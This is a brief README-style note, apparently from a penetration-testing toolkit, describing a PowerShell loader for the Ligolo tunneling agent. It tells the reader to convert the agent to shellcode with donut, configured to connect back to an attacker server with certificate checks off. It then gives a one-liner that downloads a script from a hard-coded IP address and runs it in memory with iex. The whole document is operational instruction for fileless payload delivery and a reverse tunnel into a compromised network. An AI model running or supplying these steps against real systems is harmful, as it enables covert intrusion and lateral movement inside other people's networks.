### ligolo.ps1 
- Make sure to convert agent.exe of ligolo to shellcode: `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe`
- Make sure you are running as x64 bit process before running: Powershell: `[Environment]::Is64BitProcess` CMD: `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)
- Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`

*NOTE: make sure both ligolo.ps1 and agent.bin in the same directory, then serve them by simply using python server*.
